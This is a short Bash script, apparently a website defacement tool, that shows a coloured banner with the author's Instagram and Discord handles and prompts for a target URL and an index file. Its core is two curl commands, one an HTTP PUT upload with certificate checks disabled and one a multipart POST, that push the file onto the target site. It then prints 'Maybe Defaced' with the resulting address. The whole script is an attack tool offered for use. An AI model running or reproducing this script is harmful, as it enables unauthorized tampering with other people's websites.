clear
echo -e $'\e[0;34m    ____ __        __              __    '
echo -e $'\e[0;34m   / / // /       / /_____  ____  / /____'
echo -e $'\e[0;34m  / / // /_______/ __/ __ \/ __ \/ / ___/'
echo -e $'\e[0;34m / /__  __/_____/ /_/ /_/ / /_/ / (__  ) '
echo -e $'\e[0;34m/_/  /_/        \__/\____/\____/_/____/  '                                                                                                 
echo -e $'\e[1;37m'
echo -e $'\e[0;34m[\e[1;32m*\e[0;34m]\e[1;32mInstagram \e[1;37m: \e[0;34m[\e[1;32msalihvr\e[0;34m]'
echo -e $'\e[0;34m[\e[1;32m*\e[0;34m]\e[1;32mDiscord \e[1;37m  : \e[0;34m[\e[1;32mSalihvr$#0531\e[0;34m]'
echo -e $'\e[1;37m'
read -p $'\e[0;34m[\e[1;32m*\e[0;34m]\e[1;32mWebsite Url\e[1;37m: ' url
read -p $'\e[0;34m[\e[1;32m*\e[0;34m]\e[1;32mIndex Name\e[1;37m: ' dex
echo
curl -k -T $dex $url
curl -k -X POST -F $dex $url

clear

echo -e $'\e[0;34m    ____ __        __              __    '
echo -e $'\e[0;34m   / / // /       / /_____  ____  / /____'
echo -e $'\e[0;34m  / / // /_______/ __/ __ \/ __ \/ / ___/'
echo -e $'\e[0;34m / /__  __/_____/ /_/ /_/ / /_/ / (__  ) '
echo -e $'\e[0;34m/_/  /_/        \__/\____/\____/_/____/  '                                                                                                 
echo -e $'\e[1;37m'
echo -e $'\e[0;34m[\e[1;32m*\e[0;34m]\e[1;32mInstagram \e[1;37m: \e[0;34m[\e[1;32msalihvr\e[0;34m]'
echo -e $'\e[0;34m[\e[1;32m*\e[0;34m]\e[1;32mDiscord \e[1;37m  : \e[0;34m[\e[1;32mSalihvr$#0531\e[0;34m]'
echo -e $'\e[1;37m'
echo -e $'\e[0;34m[\e[1;32m*\e[0;34m]\e[1;32mMaybe Defaced \e[1;37m: \e[0;34m'$url$dex''